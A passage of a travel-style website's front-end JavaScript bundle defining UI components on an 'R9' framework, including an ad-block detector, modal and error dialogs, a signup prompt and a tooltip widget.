      this.displaySra.onSraSlotRegisterEvent(g);
    },
    publishAllAdsRequests: function () {
      this.displaySra.publishAllAdsRequests();
    },
    onResultsPageAdsUpdate: function (g) {
      if (this.options.renderPlaceholder) h.events.publish("kn.display.render.placeholders");else this.displaySra.onResultsPageAdsUpdate(g);
    },
    onSearchStart: function (g) {
      if (!this.options.renderPlaceholder) this.displaySra.onSearchStart(g.vertical, g.searchId, g.appType, g.adsenseReq);
    },
    unregisterAllSlots: function () {
      this.displaySra.unregisterAllSlots();
    },
    onResultsPageAdsPoll: function () {
      if (!this.options.renderPlaceholder) this.displaySra.onResultsPageAdsPoll();
    },
    onAdBlockDetected: function () {
      this.displaySra.onAdBlockDetected();
    },
    modulesAjaxRequest: function (g, h, p) {
      var r = n.extend(!0, {}, g.params, g.data);
      "GET" !== g.method && (r = JSON.stringify(r));
      n.ajax({
        url: g.url,
        method: g.method,
        data: r,
        headers: g.headers,
        success: function (g) {
          h && h({
            status: 200,
            data: g
          });
        },
        error: function (g) {
          p && p(g);
        }
      });
    },
    sendUserEvent: function (g, n, p, r) {
      h.Analytics.api.trackEvent({
        category: g,
        action: n,
        label: p,
        value: r
      });
    }
  });
})(window.R9, window.jQuery);
(function (b, d) {
  b.createComponentClass("framework.JavaScriptComponent", {
    options: {
      vertical: null,
      global: !1
    },
    addEventHandlers: function () {
      var a = this;
      this.subscribe("resultspage.JavaScriptComponent.cleanup", function (c) {
        a.options.vertical === c || a.options.global ? a.options.vertical = c : a.options.singleton ? b.ComponentManager.removeSingleton(a._namespace) : a.destroy();
      });
    }
  });
})(R9, jQuery);
const JSHOOK_EVENTS = ['click', 'mouseover', 'keydown']; // Adjust as needed

(function (a, c) {
  a.createComponentClass("common.kn.BlockerDetector", {
    wasBlocked: null,
    options: {
      selfAdsUrl: null,
      remoteAdsImgUrl: null
    },
    init: function () {
      var b = this;
      a.question.answer("adblock.detected", function () {
        return {
          adblock: b.wasBlocked
        };
      });
      a.events.when("ajaxComponent.highPriority.initialized", function () {
        b.options.selfAdsUrl && c.ajax(b.options.selfAdsUrl, {
          complete: function (a, c) {
            "error" === c && b.blocked();
          }
        });
        if (b.options.remoteAdsImgUrl) {
          var a = new Image();
          a.onerror = function () {
            b.blocked();
          };
          a.onload = function () {
            b.notBlocked();
          };
          a.style = "height:0;width:0;display:block";
          a.src = b.options.remoteAdsImgUrl;
          a.alt = "";
          document.body.appendChild(a);
        }
      });
    },
    notBlocked: function () {
      this.wasBlocked || (window.adblockEnabled = !1);
    },
    blocked: function () {
      this.wasBlocked || (this.wasBlocked = 1, a.Analytics.api.trackEvent("shields-up/detected"), a.events.publish("adblock.detected"), a.globals.adBlock = 1, window.adblockEnabled = !0);
    }
  });
})(R9, jQuery);
(function (b, a) {
  b.createComponentClass("common.currency.StyleJamCurrencyMessage", {
    options: {
      displayLater: !1,
      displayImmediately: !1,
      localeCountryCode: ""
    },
    isVisible: !1,
    closeBtn: void 0,
    init: function (b) {
      this.closeBtn = a("#" + this.id("close"));
      this.options.displayImmediately ? this.showMessage() : this.options.displayLater && (this.subscribe("resultspage.view.setvisible", a.proxy(this.showMessage, this)), this.subscribe("header.view.set", {
        view: "results"
      }, a.proxy(this.showMessage, this)), this.subscribe("pageContainers.changed", {
        state: "results"
      }, a.proxy(this.showMessage, this)), this.subscribe("resultspage.routed", a.proxy(this.showMessage, this)));
    },
    addEventHandlers: function () {
      this.closeBtn.bind("click", a.proxy(this.close, this));
    },
    showMessage: function () {
      this.isVisible || (this.element.slideDown("slow"), b.action.execute("common/currency/HideCurrencyMessageAction", {
        lcc: this.options.localeCountryCode
      }), this.isVisible = !0);
    },
    close: function () {
      this.element.slideUp("slow");
    }
  });
})(window.R9, window.jQuery);
(function (a, d) {
  a.createComponentClass("common.authentication.PromotedSignup", "framework.JavaScriptComponent", {
    options: {
      showForcedSignup: !1,
      isMultiLocaleMandatorySignup: !1
    },
    init: function () {},
    inlineComponentsReady: function () {
      var c = this.options.isMultiLocaleMandatorySignup;
      this.options.showForcedSignup && setTimeout(function () {
        if (c) a.authentication.showSignup({
          promo: "multilocale",
          preventClose: !0,
          type: "login"
        });else {
          var b = window.location.href;
          -1 === b.lastIndexOf("/maps/hotelnew") && -1 === b.lastIndexOf("/reset/") && -1 === b.lastIndexOf("/mobile") && setMetaCookie("FORCED_SIGNUP_SHOWN", "true", function () {
            a.config.getBoolean("ui.forcedsignup.enabled", !1) && a.authentication.showSignup({
              promo: "promotedsignupv2"
            });
          });
        }
      }, 10);
    }
  });
})(R9, jq || jQuery);
(function (c, d) {
  function h(a, b) {
    if (a) for (var f = 0, e = a.childElementCount; f < e; f++) if (a.children) {
      var c = b ? a.children[e - f - 1] : a.children[f],
        g = c;
      if ((g && null !== g.getAttribute("tabindex") && "" !== g.getAttribute("tabindex") && "-1" !== g.getAttribute("tabindex") || -1 < k.indexOf(g.tagName) || "INPUT" === g.tagName && "hidden" !== g.getAttribute("type")) && d(g).is(":visible") || (c = h(c, b))) return c;
    }
  }
  var k = ["SELECT", "A", "BUTTON", "TEXTAREA"];
  c.createWidgetClass("dialog.Dialog", {
    content: null,
    contentBody: null,
    closeButton: null,
    modalBackground: null,
    focusBoundaries: null,
    initialFocus: null,
    lastFocus: null,
    options: {
      fullHeight: !1,
      customWidth: !1,
      modal: !0,
      blur: !1,
      onClose: null,
      onOpen: null,
      afterClose: null,
      afterOpen: null,
      initialFocusId: null,
      preventInitialFocus: !1,
      closeOnModalClick: !0,
      hasKeyboardControl: !0,
      openImmediately: !1,
      preventClose: !1,
      returnFocus: !0,
      scrollToTopOnMobile: !1,
      forceOpen: !1,
      renderInline: !1,
      isMobile: !1,
      isOpenTopZindex: !1,
      iframeResize: !0,
      iframeTopGapPercent: .08,
      preventClosingClickBubble: !1
    },
    topLevelComponent: null,
    returnElement: null,
    init: function () {
      this.resizeEventName = "resize." + this.id();
      this.content = this.getChildElement("content");
      this.contentBody = this.getChildElement("body");
      this.closeButton = this.getChildElement("close");
      this.modalBackground = this.getChildElement("modal");
      this.fixedContent = this.getChildElement("fixed-content");
      this.viewport = this.getChildElement("viewport");
      this.modal = this.getChildElement("modal");
      this.modalUniqueClass = "modal-class-" + this.modal.attr("id");
    },
    addEventHandlers: function () {
      var a = this,
        b = this.closeOnModalClick.bind(this);
      this.options.preventClose || (this.options.hasKeyboardControl && (this.registerEvent("keydown", d(document), function (b) {
        a.options.preventClose || b.which !== c.globals.keyCodes.ESC || a.close(!0);
      }), this.registerEvent("keypress", this.closeButton, function (b) {
        if (!a.options.preventClose) switch (b.which) {
          case c.globals.keyCodes.RETURN:
            a.close(!0);
        }
      })), this.registerEvent("click", this.closeButton, function () {
        a.options.preventClose || a.close(!0);
      }));
      this.options.closeOnModalClick && this.registerEvent("click", this.viewport, b);
      this.registerEvent("click", this.content, function () {
        a.viewport.off("click", b);
        setTimeout(function () {
          if (a.options.closeOnModalClick) a.viewport.on("click", b);
        }, 50);
      });
      this.subscribe("dialogs.close", function () {
        a.isOpen() && a.close();
      });
      this.options.preventClosingClickBubble && this.registerEvent("click", this.element, function (a) {
        a.stopPropagation();
      });
      this.content.one("transitionend", function () {
        c.events.publish("dialog.transitionend", a.content.attr("class"));
      });
    },
    inlineComponentsReady: function () {
      var a = this;
      this.options.modal || this.modalBackground.hide();
      this.topLevelComponent = this.contentBody.children("div").eq("0");
      this.options.renderInline && d(c.config.getString("ui.horizon.output.container", "body")).append(this.element);
      this.options.openImmediately ? (this.element.addClass("animate"), c.dom.schedule(this.open.bind(this))) : setTimeout(function () {
        a.element.addClass("animate");
      }, 100);
      this.getChildElement("focusStartBoundary").focus(this.resetFocus.bind(this, !1));
      this.getChildElement("focusEndBoundary").focus(this.resetFocus.bind(this, !0));
    },
    closeOnModalClick: function (a) {
      a = d(a.target).closest(".content");
      this.content[0] === a[0] || this.options.preventClose || this.close(!0);
    },
    calculateDimensions: function () {
      if (this.topLevelComponent && this.topLevelComponent.length) {
        var a = this.topLevelComponent[0].getBoundingClientRect(),
          b = this.content[0].getBoundingClientRect(),
          f = "number" === typeof this.topLevelComponent.outerWidth() ? Math.ceil(a.width) : null,
          a = "number" === typeof this.topLevelComponent.outerHeight() ? Math.ceil(a.height) : null;
        this.options.customWidth || f === Math.ceil(b.width) || this.content.width(f);
        this.options.fullHeight || a === Math.ceil(b.height) || this.content.height(a);
      }
    },
    resetFocus: function (a) {
      (a = a ? this.fixedContent && this.initialFocus ? this.initialFocus : this.closeButton : this.lastFocus ? this.lastFocus : this.findFirstFocusableElement(!0)) && "function" === typeof a.focus && a.focus();
      return !1;
    },
    handleKeyPress: function (a) {
      switch (a.which) {
        case c.globals.keyCodes.ESC:
          this.close(!0);
      }
    },
    setContentDimensions: function (a, b, f) {
      void 0 !== a && this.content.width(a);
      void 0 !== b && this.content.height(b);
      f && this.content.css({
        maxWidth: f
      });
    },
    setViewPortOverflow: function (a, b) {
      this.viewport && this.viewport.length && (a && this.viewport.css({
        overflowX: a
      }), b && this.viewport.css({
        overflowX: b
      }));
    },
    setContent: function (a) {
      this.contentBody.html(a);
      this.topLevelComponent = this.contentBody.children("div").eq("0");
    },
    close: function (a) {
      var b = this;
      if (this.isOpen() && !this.options.forceOpen) {
        var f,
          e = d("body");
        this.isTouchDevice() && (f = e.css("top").replace("-", "").replace("px", ""), e.css({
          overflow: "",
          position: "",
          width: ""
        }));
        this.options.iframeResize && window.parentIFrame && "function" === typeof window.parentIFrame.getPageInfo && window.parentIFrame.getPageInfo(!1);
        e.scrollTop(f);
        this.element.removeClass("visible");
        this.element.attr("aria-hidden", !0);
        c.globals.testMode && this.element.attr("data-test-popover-open", !1);
        if ("function" === typeof this.options.onClose) this.options.onClose(this.element, a);
        this.options.isOpenTopZindex && this.element.css("z-index", -1);
        c.events.publish("dialog.close", {
          id: b.id()
        });
        this.options.blur && c.events.publish("pageContainer.contentBlur", !1);
        e.removeClass(this.modalUniqueClass);
        0 > e.attr("class").indexOf("modal-class-") && e.removeClass("hideOverflow modal-open");
        this.returnElement && this.returnElement.length && (this.returnElement.focus(), this.returnElement = null);
        d(window).off(this.resizeEventName);
        setTimeout(function () {
          "function" === typeof b.options.afterClose && b.options.afterClose();
        }, 50);
      }
    },
    open: function (a) {
      if (!this.isOpen()) {
        this.topLevelComponent && 0 !== this.topLevelComponent.length || (this.topLevelComponent = this.contentBody.children("div").eq("0"));
        this.options.preventClose && this.closeButton.hide();
        this.options.returnFocus && (this.returnElement = d(document.activeElement));
        if (this.options.isOpenTopZindex) {
          var b = 0;
          this.element.siblings("[role\x3ddialog],[role\x3dalertdialog]").each(function () {
            var a = window.parseInt(d(this).css("z-index"));
            a && a > b && (b = a);
          });
          0 < b && this.element.css("z-index", b + 1);
        }
        c.events.publish(["common.dropdown.closeAll", "common.widgets.tooltip.closeAll"]);
        this.element.addClass("visible");
        this.element.attr("aria-hidden", !1);
        c.globals.testMode && this.element.attr("data-test-popover-open", !0);
        null === this.initialFocus && this.setFocusTargets();
        this.options.preventInitialFocus || this.focusInitialElement();
        this.options.iframeResize && window.parentIFrame && "function" === typeof window.parentIFrame.getPageInfo && window.parentIFrame.getPageInfo(this.positionOnIframe.bind(this));
        if ("function" === typeof this.options.onOpen) this.options.onOpen(this.element);
        "function" === typeof a && a(this.element);
        this.modalBackground.length && (d("body").addClass("hideOverflow modal-open"), d("body").addClass(this.modalUniqueClass));
        this.options.blur && c.events.publish("pageContainer.contentBlur", !0);
        null !== this.topLevelComponent && setTimeout(this.calculateDimensions.bind(this), 1);
        this.isTouchDevice() && this.options.scrollToTopOnMobile && d("body").css({
          overflow: "hidden",
          position: "fixed",
          width: "100%"
        });
        d(window).off(this.resizeEventName).on(this.resizeEventName, this.calculateDimensions.bind(this));
        "function" === typeof this.options.afterOpen && this.options.afterOpen();
      }
    },
    positionOnIframe: function (a) {
      if (a && this.viewport) {
        var b = a.windowHeight * this.options.iframeTopGapPercent,
          c = a.scrollTop,
          e = a.offsetTop,
          d = this.content.height(),
          g = this.modal.height();
        a = a.windowHeight;
        var h = this.viewport.height();
        this.content.addClass("no-margin");
        d > a && h !== a && this.viewport.css("height", "auto");
        c < e ? this.viewport.css("top", 0) : c - e < b ? this.viewport.css("top", 2 * (c - e) + "px") : c - e + b + d >= g ? this.viewport.css("top", g - d + "px") : this.viewport.css("top", c - e + Math.round(b) + "px");
      }
    },
    focusInitialElement: function () {
      var a = this;
      setTimeout(function () {
        var b = a.initialFocus && a.initialFocus.get(0);
        b && "function" === typeof b.focus && b.focus();
      }, 501);
    },
    setFocusTargets: function () {
      this.focusBoundaries = this.getChildElement("focusStartBoundary").add(this.getChildElement("focusEndBoundary"));
      this.initialFocus = this.findFirstFocusableElement(!1);
      this.lastFocus = this.findFirstFocusableElement(!0);
    },
    findFirstFocusableElement: function (a) {
      if (this.options.initialFocusId && !a) return d("#" + this.options.initialFocusId);
      var b;
      this.fixedContent && (b = h(this.fixedContent[0], a));
      this.closeButton || b || (b = h(this.contentBody[0], a));
      b || (b = this.closeButton);
      return d(b);
    },
    isOpen: function () {
      return this.element.hasClass("visible");
    },
    isTouchDevice: function () {
      return "ontouchstart" in window || navigator && navigator.maxTouchPoints;
    },
    destroy: function () {
      this.base();
      this.content.off("transitionend");
      this.element.remove();
    }
  });
})(R9, jQuery);
(function (b, c) {
  b.createComponentClass("common.errors.ErrorDialog", {
    dialog: null,
    dialogEl: null,
    title: null,
    messages: null,
    init: function () {
      this.dialogEl = this.getChildElement("dialog");
      this.dialog = this.dialogEl.dialog({}).getWidget();
      this.title = this.getChildElement("title");
      this.messages = this.getChildElement("messages");
    },
    addEventHandlers: function () {
      var a = this;
      this.subscribe("error.alert", this.show.bind(this));
      b.events.when("error.alert", this.show.bind(this));
      this.subscribe("error.dismiss", this.hide.bind(this));
      this.getChildElement("close").on("click keydown", function (c) {
        c.keyCode !== b.globals.keyCodes.TAB && a.dialog.close();
      });
    },
    show: function (a) {
      var b = this;
      a.title ? (this.title.html(a.title), this.dialogEl.addClass("hasTitle")) : (this.title.html(""), this.dialogEl.removeClass("hasTitle"));
      this.messages.html("");
      a.messages && (c.isArray(a.messages) || (a.messages = [a.messages]), c.each(a.messages, function (a, d) {
        a = c("\x3cli\x3e").html(d);
        b.messages.append(a);
      }));
      this.dialog.open();
    },
    hide: function () {
      this.dialog.close();
    }
  });
})(R9, jQuery);
(function (b, c) {
  b.createComponentClass("common.layout.StandardBody", {
    pageContentEl: null,
    allowMove: !1,
    noMoveClasses: {
      results: !0
    },
    stateClasses: {
      results: "ResultsPageBody"
    },
    options: {
      useReactHeaderV2: !1,
      isResponsivePage: !1,
      allowContentMove: !1,
      isNewNavUXEnabled: !1
    },
    init: function () {
      this.options.useReactHeaderV2 && (this.pageContentEl = this.getChildElement("pageContent"), this.allowMove = this.options.isResponsivePage);
    },
    addEventHandlers: function () {
      this.options.useReactHeaderV2 && (this.options.allowContentMove || (this.subscribe(["header.view.set", "pageContainers.changed"], function (a) {
        Object.prototype.hasOwnProperty.call(this.noMoveClasses, a.view) && (this.allowMove = !this.noMoveClasses[a.view], b.events.publish("page.layout.responsive.changed", {
          responsive: !1
        }), this.pageContentEl.removeClass("moved"));
      }.bind(this)), this.subscribe("resultspage.view.setvisible", function () {
        this.allowMove = !1;
        b.events.publish("page.layout.responsive.changed", {
          responsive: !1
        });
        this.pageContentEl.removeClass("moved");
      }.bind(this))), this.subscribe("navigation.drawer.open", this.handleMovePageContent.bind(this)));
    },
    handleMovePageContent: function (a) {
      this.allowMove && this.pageContentEl.toggleClass("moved", !!a.open);
      a.isMobile && c("body").toggleClass("hideOverflow modal-open", !!a.open);
    }
  });
})(R9, jQuery);
(function (e, g) {
  g.openTooltipInstances = {};
  var b = !1;
  R9.extend("Widgets", {
    Tooltip: function (a, d) {
      this.element = e(a);
      this.element.data(this.widgetName, this);
      this.setOptions(d, !0);
    }
  });
  R9.extend("Widgets.Tooltip", {
    validateElement: function (a) {
      return void 0 === e(a).data(this.prototype.widgetName);
    },
    getInstance: function (a, d) {
      return this.validateElement(a) ? new R9.Widgets.Tooltip(a, d) : (a = e(a).data(this.prototype.widgetName), d ? a.setOptions(d) : a);
    },
    removeWidget: function (a) {
      this.validateElement(a) || this.getInstance(a).removeWidget();
    },
    setDebug: function (a) {
      b = a;
    },
    isDebug: function () {
      return b;
    }
  });
  R9.extend("Widgets.Tooltip.prototype", {
    element: null,
    widgetNamespace: "r9-tooltip",
    widgetBaseClass: "r9-tooltip",
    widgetName: "tooltip",
    positionTarget: "data-tooltip-position-target",
    isOpen: !1,
    options: {
      delay: 200,
      fadeIn: 200,
      fadeOut: 200,
      edgeOffset: 3,
      baseClass: null,
      content: null,
      positionTarget: null,
      position: "top",
      activation: "hover",
      showImmediately: !1,
      subNameSpace: "",
      onOpen: null,
      fixedPositioning: null,
      onClose: null,
      positionUpdate: !1,
      appendTo: "body",
      offsetLeft: 0,
      offsetAgainstEdge: !0,
      keepOpenOnContentHover: !1,
      keepOpenOnPositionTargetHover: !1,
      readContentOnOpen: !1,
      keepOpenOnRelatedTargetHover: !0,
      closeDelay: 0,
      fallbackPosition: null,
      forceDesiredPosition: !1
    },
    _timer: null,
    _closeTimer: null,
    _originalTitle: null,
    _positionUpdater: null,
    init: function () {
      this._removeAllWidgetBindings();
      openTooltipInstances.hasOwnProperty(this.options.subNameSpace) || (openTooltipInstances[this.options.subNameSpace] = null);
      var a = this,
        d = a._getContainerElement(),
        c = a._getArrowElement();
      switch (this.options.activation) {
        case "click":
          this.element.on("click." + this.widgetName, function (c) {
            null === openTooltipInstances[a.options.subNameSpace] && (a.isOpen = !1);
            a.isOpen ? a.close(c) : setTimeout(a.open.bind(a, c), 0);
          });
          this.options.keepOpenOnContentHover || this.bindContainerHoverEvents();
          this.options.showImmediately && this.element.trigger("click." + this.widgetName);
          break;
        case "focus":
          this.element.on("focus." + this.widgetName, function (c) {
            a.open(c);
          });
          this.element.on("blur." + this.widgetName, function (c) {
            a.close(c);
          });
          this.options.showImmediately && this.element.trigger("focus." + this.widgetName);
          break;
        default:
          this.element.on("mouseenter." + this.widgetName, function (c) {
            a.triggeredMouseOpen = !0;
            clearTimeout(a._closeTimer);
            a.open(c);
          });
          var b = this.options.keepOpenOnPositionTargetHover ? this._getPositionTarget() : this.element;
          b.on("mouseleave." + this.widgetName, function (b) {
            a.triggeredMouseOpen = !1;
            a.options.keepOpenOnRelatedTargetHover && (e(b.relatedTarget).closest(d).length || e(b.relatedTarget).closest(c).length) || (a.options.closeDelay ? a._closeTimer = setTimeout(function () {
              a.close(b);
            }, a.options.closeDelay) : a.close(b));
          });
          if (R9.config && R9.config.getBoolean("ui.common.widgets.tooltip.touchend", !0)) b.on("touchend." + this.widgetName, function () {
            a.triggeredMouseOpen && (a.triggeredMouseOpen = !1, b.off("click.touchendfix").on("click.touchendfix", function () {
              b.off("click.touchendfix");
              a.element.trigger("mouseenter." + a.widgetName);
            }));
          });
          this.options.showImmediately && this.element.trigger("mouseenter." + this.widgetName);
          this.options.keepOpenOnContentHover && this.bindContainerHoverEvents();
      }
      return this;
    },
    bindContainerHoverEvents: function () {
      var a = this;
      this._getContainerElement().on("mouseenter." + this.widgetName, function () {
        a.isOpen && clearTimeout(a._closeTimer);
      }).on("mouseleave." + this.widgetName, function (d) {
        a.isOpen && !e(d.relatedTarget).closest(a._getArrowElement()).length && (a._closeTimer = setTimeout(function () {
          a.close(d);
        }, a.options.closeDelay));
      });
    },
    setOptions: function (a, d) {
      a && (this.options = e.extend({}, this.options, a));
      (a || d) && this.init();
      return this;
    },
    open: function (a) {
      var d = this.getContent(a);
      if (!d || this.isOpen) return this;
      var c = !1;
      openTooltipInstances[this.options.subNameSpace] && openTooltipInstances[this.options.subNameSpace] !== this && (c = !0, openTooltipInstances[this.options.subNameSpace].close(a, c));
      var b = this._getWrapperElement(),
        f = this._getContainerElement(),
        h = this._getArrowElement();
      this.renderContent(d, f);
      this._resetElements(b, f, h);
      d = this._getPositionMap(b, h);
      this._updateArrowElement(d, h);
      this._updateWrapperElement(d, b);
      this._updateContainerElement(d, f);
      if (this.options.fixedPositioning) {
        var k = this;
        Object.keys(this.options.fixedPositioning).forEach(function (a) {
          b.css(a, k.options.fixedPositioning[a]);
        });
        b.css("position", "fixed");
      }
      this._timer && clearTimeout(this._timer);
      this._closeTimer && clearTimeout(this._closeTimer);
      this.isOpen = !0;
      openTooltipInstances[this.options.subNameSpace] = this;
      if (this.options.delay) {
        var m = this;
        this._timer = setTimeout(function () {
          m._open(b, a, c);
        }, this.options.delay);
      } else this._open(b, a, c);
      this._positionUpdater && clearInterval(this._positionUpdater);
      e(g).on("resize", e.proxy(this._updatePosition, this));
      return this;
    },
    renderContent: function (a, d) {
      d.html(a);
    },
    close: function (a, d) {
      if (!R9.Widgets.Tooltip.isDebug()) {
        this._timer && clearTimeout(this._timer);
        this._closeTimer && clearTimeout(this._closeTimer);
        this._positionUpdater && clearInterval(this._positionUpdater);
        e(g).off("resize", this._updatePosition);
        a = this._getWrapperElement();
        a.stop(!0, !0);
        this.isOpen = !1;
        openTooltipInstances[this.options.subNameSpace] = null;
        var c = this;
        this.options.fadeOut && !d ? a.fadeOut(this.options.fadeOut, function () {
          c._close();
        }) : (a.hide(), this._close());
        return this;
      }
    },
    getContent: function (a) {
      var d = this.element.attr("title");
      d && (this._originalTitle = d, this.element.removeAttr("title"));
      return this.options.content ? "function" == typeof this.options.content ? this.options.content.call(this, a) : this.options.content : this._originalTitle ? this._originalTitle : null != this.element.data("title") ? this.element.data("title") : this.element.text();
    },
    removeWidget: function () {
      this._removeAllWidgetBindings();
      this.element.removeData(this.widgetName);
      this.close();
      return this;
    },
    _updatePosition: function () {
      var a = this._getWrapperElement(),
        d = this._getContainerElement(),
        c = this._getArrowElement(),
        b = this._getPositioning(a, c);
      this._updateArrowElement(b, c);
      "rtl" !== document.dir && a.css({
        top: b.newWrapperTop + "px",
        left: b.newWrapperLeft + "px"
      });
      this._updateContainerElement(b, d);
    },
    _getWrapperElement: function () {
      var a = e("#" + this._getIdValue("-wrapper"));
      a.length || (a = this._createDOMElement("-wrapper"), this.options.readContentOnOpen ? a.attr("role", "alert") : a.attr("role", "tooltip"), e(this.options.appendTo).append(a));
      return a;
    },
    _getContainerElement: function () {
      var a = e("#" + this._getIdValue("-container"));
      a.length || (a = this._createDOMElement("-container"), this._getWrapperElement().append(a));
      return a;
    },
    _getArrowElement: function () {
      var a = e("#" + this._getIdValue("-arrow"));
      a.length || (a = this._createDOMElement("-arrow"), this._getWrapperElement().append(a));
      return a;
    },
    _createDOMElement: function (a) {
      var d = e("\x3cdiv\x3e\x3c/div\x3e").attr("id", this._getIdValue(a));
      this._setStyleClasses(d, a);
      return d;
    },
    _removeAllWidgetBindings: function () {
      this.element.off("click." + this.widgetName).off("focus." + this.widgetName).off("blur." + this.widgetName).off("mouseenter." + this.widgetName).off("mouseleave." + this.widgetName).off("touchend." + this.widgetName);
      return this;
    },
    _getPositionTarget: function () {
      var a = this.options.positionTarget || this.element.attr(this.positionTarget);
      return a && (a = this.options.positionTarget ? e("#" + this.options.positionTarget) : e(a, this.element), 0 < a.length) ? a : this.element;
    },
    _getOffsetInformation: function (a, d, c) {
      var b = this._getPositionTarget();
      this.options.fixedPositioning && this._getContainerElement();
      var f = b.outerWidth(),
        h = b.outerHeight();
      a = "width" === a ? c.outerWidth() : c.outerHeight();
      return {
        arrowSize: Math.round(a / 2),
        elementWidth: f,
        elementHeight: h,
        wrapperWidth: d.outerWidth(),
        wrapperHeight: d.outerHeight(),
        offset: {
          top: Math.floor(b.offset().top - e(this.options.appendTo).offset().top),
          left: Math.floor(b.offset().left - e(this.options.appendTo).offset().left)
        }
      };
    },
    _getPositionMap: function (a, b) {
      a.attr("style", "").css({
        top: "-1000px",
        left: "-5000px",
        display: "block"
      });
      return this._getPositioning(a, b);
    },
    _getPositioning: function (a, b, c) {
      switch (c || this.options.position) {
        case "bottom":
          return this._getBottomPositioning(a, b);
        case "left":
          return this._getLeftPositioning(a, b);
        case "right":
          return this._getRightPositioning(a, b);
        default:
          return this._getTopPositioning(a, b);
      }
    },
    _getCommonPositioningMap: function () {
      return {
        newArrowTop: 0,
        newArrowLeft: 0,
        newWrapperTop: 0,
        newWrapperLeft: 0,
        wrapperClass: ""
      };
    },
    getLeftRightOffsetAgainstEdge: function (a, b, c) {
      if (this.options.offsetAgainstEdge) {
        var d = e(this.options.appendTo).offset(),
          f = d ? d.left + e(this.options.appendTo).width() : e(this.options.appendTo).width(),
          h,
          k = null != d && a < d.left,
          g = !isNaN(f) && a + c.wrapperWidth > f;
        k ? h = Math.floor(d.left + this.options.edgeOffset) : g && (h = Math.floor(f - c.wrapperWidth - this.options.edgeOffset));
        if (k || g) b = b + a - h, a = h;
      }
      return {
        wrapperLeft: a,
        arrowLeft: b
      };
    },
    _getTopPositioning: function (a, b) {
      var c = this._getOffsetInformation("height", a, b),
        d = c.elementWidth / 2,
        f = "-top",
        h = c.wrapperHeight,
        k = c.offset.top - this.options.edgeOffset - c.arrowSize - c.wrapperHeight;
      if (!this.options.forceDesiredPosition && 0 >= k) {
        if (this.options.fallbackPosition && "top" !== this.options.fallbackPosition) return this._getPositioning(a, b, this.options.fallbackPosition);
        f = "-bottom";
        k = c.offset.top + c.elementHeight + this.options.edgeOffset + c.arrowSize;
        h = -1 * c.arrowSize;
      }
      a = this.getLeftRightOffsetAgainstEdge(c.offset.left + d - c.wrapperWidth / 2 + this.options.offsetLeft, c.wrapperWidth / 2 - c.arrowSize, c);
      return e.extend(this._getCommonPositioningMap(), {
        newArrowTop: Math.round(h),
        newArrowLeft: Math.round(a.arrowLeft),
        newWrapperTop: Math.round(k),
        newWrapperLeft: Math.round(a.wrapperLeft),
        wrapperClass: f
      });
    },
    _getBottomPositioning: function (a, b) {
      var c = this._getOffsetInformation("height", a, b),
        d = c.elementWidth / 2,
        f = "-bottom",
        h = -1 * c.arrowSize,
        k = c.offset.top + c.elementHeight + this.options.edgeOffset + c.arrowSize;
      if (!this.options.forceDesiredPosition && k + c.wrapperHeight >= jq(g).scrollTop() + e(g).height()) {
        if (this.options.fallbackPosition && "bottom" !== this.options.fallbackPosition) return this._getPositioning(a, b, this.options.fallbackPosition);
        f = "-top";
        k = c.offset.top - this.options.edgeOffset - c.arrowSize - c.wrapperHeight;
        h = c.wrapperHeight;
      }
      a = this.getLeftRightOffsetAgainstEdge(c.offset.left + d - c.wrapperWidth / 2 + this.options.offsetLeft, c.wrapperWidth / 2 - c.arrowSize, c);
      return e.extend(this._getCommonPositioningMap(), {
        newArrowTop: Math.round(h),
        newArrowLeft: Math.round(a.arrowLeft),
        newWrapperTop: Math.round(k),
        newWrapperLeft: Math.round(a.wrapperLeft),
        wrapperClass: f
      });
    },
    _getLeftPositioning: function (a, b) {
      var c = this._getOffsetInformation("width", a, b),
        d = c.elementHeight / 2,
        f = c.wrapperHeight / 2,
        h = "-left",
        k = "rtl" === document.dir ? -c.arrowSize : c.wrapperWidth,
        g = "rtl" === document.dir ? c.offset.left + this.options.edgeOffset + c.arrowSize + c.elementWidth : c.offset.left - this.options.edgeOffset - c.arrowSize - c.wrapperWidth;
      if (!this.options.forceDesiredPosition && 0 >= g) {
        if (this.options.fallbackPosition && "left" !== this.options.fallbackPosition) return this._getPositioning(a, b, this.options.fallbackPosition);
        h = "-right";
        g = c.offset.left + c.elementWidth + this.options.edgeOffset + c.arrowSize;
        k = -1 * c.arrowSize;
      }
      return e.extend(this._getCommonPositioningMap(), {
        newArrowTop: Math.round(f - c.arrowSize),
        newArrowLeft: Math.round(k),
        newWrapperTop: Math.round(c.offset.top + d - f),
        newWrapperLeft: Math.round(g),
        wrapperClass: h
      });
    },
    _getRightPositioning: function (a, b) {
      var c = this._getOffsetInformation("border-right-width", a, b),
        d = c.elementHeight / 2,
        f = c.wrapperHeight / 2,
        h = "-right",
        k = "rtl" === document.dir ? c.wrapperWidth : -1 * c.arrowSize,
        m = "rtl" === document.dir ? c.offset.left - c.wrapperWidth - c.arrowSize : c.offset.left + c.elementWidth + this.options.edgeOffset + c.arrowSize;
      if (!this.options.forceDesiredPosition && m + c.wrapperWidth >= e(g).width()) {
        if (this.options.fallbackPosition && "right" !== this.options.fallbackPosition) return this._getPositioning(a, b, this.options.fallbackPosition);
        a = c.offset.left - this.options.edgeOffset - c.arrowSize - c.wrapperWidth;
        0 <= a && (h = "-left", m = a, k = c.wrapperWidth);
      }
      return e.extend(this._getCommonPositioningMap(), {
        newArrowTop: Math.round(f - c.arrowSize),
        newArrowLeft: Math.round(k),
        newWrapperTop: Math.round(c.offset.top + d - f),
        newWrapperLeft: Math.round(m),
        wrapperClass: h
      });
    },
    _setStyleClasses: function (a, b, c) {
      a.attr("class", "");
      this._addStyleClasses(a, b, c);
      return this;
    },
    _addStyleClasses: function (a, b, c) {
      b && (a.addClass(this.widgetBaseClass + b), c && a.addClass(this.widgetBaseClass + b + c), this.options.baseClass && (a.addClass(this.options.baseClass + b), c && a.addClass(this.options.baseClass + b + c)));
      return this;
    },
    _updateWrapperElement: function (a, b) {
      this._addStyleClasses(b, "-wrapper", a.wrapperClass);
      b.attr("style", "");
      "number" === typeof a.newWrapperTop && b.css("top", a.newWrapperTop + "px");
      "number" === typeof a.newWrapperLeft && b.css({
        left: a.newWrapperLeft + "px",
        right: ""
      });
      return this;
    },
    _updateArrowElement: function (a, b) {
      this._addStyleClasses(b, "-arrow", a.wrapperClass);
      b.css({
        top: a.newArrowTop + "px"
      });
      b.css({
        left: a.newArrowLeft + "px",
        right: ""
      });
      return this;
    },
    _updateContainerElement: function (a, b) {
      this._addStyleClasses(b, "-container", a.wrapperClass);
      this.options.updateContainerOnResize && b.css({
